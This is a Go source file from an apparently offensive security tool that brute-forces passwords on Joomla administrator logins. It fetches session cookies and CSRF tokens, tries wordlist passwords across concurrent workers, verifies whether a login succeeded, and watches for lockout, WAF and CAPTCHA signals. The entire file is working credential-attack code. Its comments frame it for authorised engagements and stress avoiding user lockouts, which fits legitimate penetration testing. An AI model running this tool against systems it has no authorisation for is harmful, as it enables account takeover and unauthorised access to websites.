package bruteforce

import (
	"context"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/w41l3r/joomhound/internal/http"
	"github.com/w41l3r/joomhound/internal/models"
)

// ErrAccountLockout is returned when the target starts rejecting attempts in
// a way that indicates lockout, banning, or WAF intervention. Continuing past
// this point produces false negatives and can lock out a real user during an
// engagement, so the attack stops.
var ErrAccountLockout = errors.New("account lockout or blocking detected; aborting brute-force")

// lockoutSignatures are response markers that indicate the target has started
// blocking us rather than simply rejecting the password.
var lockoutSignatures = []*regexp.Regexp{
	regexp.MustCompile(`(?i)too many (failed )?(login )?attempts`),
	regexp.MustCompile(`(?i)account (has been |is )?(temporarily )?(locked|disabled|blocked|suspended)`),
	regexp.MustCompile(`(?i)try again (in|later|after)`),
	regexp.MustCompile(`(?i)(you have been|ip .{0,20})(blocked|banned|blacklisted)`),
	regexp.MustCompile(`(?i)rate ?limit`),
	regexp.MustCompile(`(?i)brute[- ]?force protection`),
	regexp.MustCompile(`(?i)(access denied|forbidden) by (mod_security|waf|firewall)`),
	regexp.MustCompile(`(?i)captcha`),
}

// LockoutPolicy controls lockout detection sensitivity.
type LockoutPolicy struct {
	// Enabled turns detection on.
	Enabled bool
	// MaxConsecutiveErrors is how many consecutive transport/HTTP errors are
	// tolerated before we assume we are being blocked.
	MaxConsecutiveErrors int
	// StopOnSignature aborts as soon as a lockout signature is seen in a body.
	StopOnSignature bool
}

// DefaultLockoutPolicy is conservative: during a real engagement, locking out
// a legitimate user is a client-impacting incident.
func DefaultLockoutPolicy() LockoutPolicy {
	return LockoutPolicy{
		Enabled:              true,
		MaxConsecutiveErrors: 5,
		StopOnSignature:      true,
	}
}

// PasswordBruteforcer performs credential attacks against a Joomla install.
type PasswordBruteforcer struct {
	client  *http.Client
	threads int

	// DelayBetween is an additional per-attempt delay on top of the client's
	// global rate limit.
	DelayBetween time.Duration
	// Lockout configures lockout detection.
	Lockout LockoutPolicy
	// OnAttempt, when set, is called after every attempt for progress output.
	OnAttempt func(username, password string, ok bool)
	// OnMessage reports notable events (lockout, token loss).
	OnMessage func(string)

	attempts atomic.Int64
	// consecutiveErrors is shared across workers for lockout detection.
	consecutiveErrors atomic.Int64
	lockoutTripped    atomic.Bool
}

// NewPasswordBruteforcer creates a brute-forcer.
//
// The default concurrency is deliberately low: credential attacks against a
// live target are the single most likely thing to trip lockout or a WAF.
func NewPasswordBruteforcer(client *http.Client, threads int) *PasswordBruteforcer {
	if threads <= 0 {
		threads = 4
	}
	return &PasswordBruteforcer{
		client:  client,
		threads: threads,
		Lockout: DefaultLockoutPolicy(),
	}
}

func (pb *PasswordBruteforcer) logf(format string, args ...any) {
	if pb.OnMessage != nil {
		pb.OnMessage(fmt.Sprintf(format, args...))
	}
}

// Attempts returns how many login attempts were made.
func (pb *PasswordBruteforcer) Attempts() int64 { return pb.attempts.Load() }

// BruteForcePassword tries each password for username, stopping at the first
// success, on lockout, or when ctx is cancelled.
//
// Fixes over the previous implementation:
//   - the old code called close(done) from every successful goroutine, which
//     panics with "close of closed channel" as soon as two passwords matched
//     (or one matched twice via retries);
//   - the `done` channel was only checked by the *producer* loop, so all
//     goroutines were spawned before the first result came back and the whole
//     wordlist ran regardless of success;
//   - goroutines were created for the entire wordlist up front, so a 10M-entry
//     list allocated 10M goroutines before the semaphore throttled anything.
func (pb *PasswordBruteforcer) BruteForcePassword(
	ctx context.Context,
	targetURL string,
	username string,
	passwords []string,
) (*models.User, error) {
	result := &models.User{Username: username, Found: true}

	if len(passwords) == 0 {
		return result, nil
	}

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	var (
		mu        sync.Mutex
		wg        sync.WaitGroup
		once      sync.Once
		lockErr   error
		jobs      = make(chan string)
		workerN   = pb.threads
		succeeded bool
	)

	if workerN > len(passwords) {
		workerN = len(passwords)
	}

	for i := 0; i < workerN; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pass := range jobs {
				if ctx.Err() != nil {
					return
				}

				if pb.DelayBetween > 0 {
					if !sleepCtx(ctx, pb.DelayBetween) {
						return
					}
				}

				ok, err := pb.tryPassword(ctx, targetURL, username, pass)
				pb.attempts.Add(1)

				if pb.OnAttempt != nil {
					pb.OnAttempt(username, pass, ok)
				}

				switch {
				case errors.Is(err, ErrAccountLockout):
					once.Do(func() {
						lockErr = err
						pb.logf("[!] lockout detected for %s after %d attempts; stopping", username, pb.attempts.Load())
						cancel()
					})
					return
				case err != nil:
					n := pb.consecutiveErrors.Add(1)
					if pb.Lockout.Enabled && int(n) >= pb.Lockout.MaxConsecutiveErrors {
						once.Do(func() {
							lockErr = fmt.Errorf("%w: %d consecutive request failures (last: %v)",
								ErrAccountLockout, n, err)
							cancel()
						})
						return
					}
					continue
				default:
					pb.consecutiveErrors.Store(0)
				}

				if ok {
					// once.Do replaces the racy close(done): only the first
					// success records the credential and cancels the rest.
					once.Do(func() {
						mu.Lock()
						result.Password = pass
						result.PasswordValid = true
						succeeded = true
						mu.Unlock()
						cancel()
					})
					return
				}
			}
		}()
	}

	// Feed passwords lazily so memory stays constant regardless of wordlist size.
producer:
	for _, p := range passwords {
		select {
		case <-ctx.Done():
			break producer
		case jobs <- p:
		}
	}
	close(jobs)
	wg.Wait()

	mu.Lock()
	defer mu.Unlock()

	if lockErr != nil && !succeeded {
		return result, lockErr
	}
	return result, nil
}

// BruteForceMultipleUsers runs BruteForcePassword for each user, sequentially
// by default so that lockout on one account aborts the whole run before the
// next account is touched.
func (pb *PasswordBruteforcer) BruteForceMultipleUsers(
	ctx context.Context,
	targetURL string,
	users []string,
	passwords []string,
) ([]models.User, error) {
	var out []models.User

	for _, u := range users {
		if ctx.Err() != nil {
			return out, ctx.Err()
		}
		res, err := pb.BruteForcePassword(ctx, targetURL, u, passwords)
		if res != nil {
			out = append(out, *res)
		}
		if errors.Is(err, ErrAccountLockout) {
			return out, err
		}
	}
	return out, nil
}

// tryPassword performs one administrator login attempt.
//
// Unlike the previous version this uses a real session: it GETs the login
// page to obtain a session cookie and CSRF token, POSTs with that token, and
// then verifies the authenticated state. It also stops trying three different
// endpoints per password, which tripled the request volume (and the lockout
// risk) for no gain.
func (pb *PasswordBruteforcer) tryPassword(ctx context.Context, targetURL, username, password string) (bool, error) {
	sess, err := newAdminSession(ctx, pb.client, targetURL)
	if err != nil {
		return false, err
	}

	form := url.Values{
		"username": {username},
		"passwd":   {password},
		"option":   {"com_login"},
		"task":     {"login"},
		"return":   {base64Return("index.php")},
	}
	if sess.token != "" {
		form.Set(sess.token, "1")
	}

	resp, err := sess.client.PostForm(ctx, sess.loginURL, form)
	if err != nil {
		return false, err
	}

	body := resp.String()

	if pb.Lockout.Enabled && pb.Lockout.StopOnSignature {
		if sig := matchLockout(body, resp.StatusCode); sig != "" {
			pb.lockoutTripped.Store(true)
			return false, fmt.Errorf("%w: %s", ErrAccountLockout, sig)
		}
	}

	// A 3xx away from the login page is the usual success path. Follow up
	// with an authenticated GET to confirm rather than trusting a keyword.
	verify, err := sess.client.Get(ctx, sess.loginURL)
	if err != nil {
		return false, err
	}
	vbody := verify.String()

	if pb.Lockout.Enabled && pb.Lockout.StopOnSignature {
		if sig := matchLockout(vbody, verify.StatusCode); sig != "" {
			pb.lockoutTripped.Store(true)
			return false, fmt.Errorf("%w: %s", ErrAccountLockout, sig)
		}
	}

	return isAuthenticated(vbody), nil
}

// isAuthenticated decides whether a rendered administrator page belongs to a
// logged-in session.
//
// The old heuristic matched substrings like "Home" and "Administrator" as
// success markers - both of which appear on the *login* page itself, so any
// password could be reported as valid. The rule now is structural: the login
// form must be gone AND a backend-only marker must be present.
func isAuthenticated(body string) bool {
	if body == "" {
		return false
	}
	if reLoginForm.MatchString(body) {
		return false // still being shown the login form
	}
	return reAdminSuccess.MatchString(body)
}

// matchLockout returns a description of the lockout signal found, or "".
func matchLockout(body string, status int) string {
	if status == 429 {
		return "HTTP 429 Too Many Requests"
	}
	for _, re := range lockoutSignatures {
		if m := re.FindString(body); m != "" {
			return "response matched lockout signature: " + strings.TrimSpace(m)
		}
	}
	return ""
}

func sleepCtx(ctx context.Context, d time.Duration) bool {
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-ctx.Done():
		return false
	case <-t.C:
		return true
	}
}
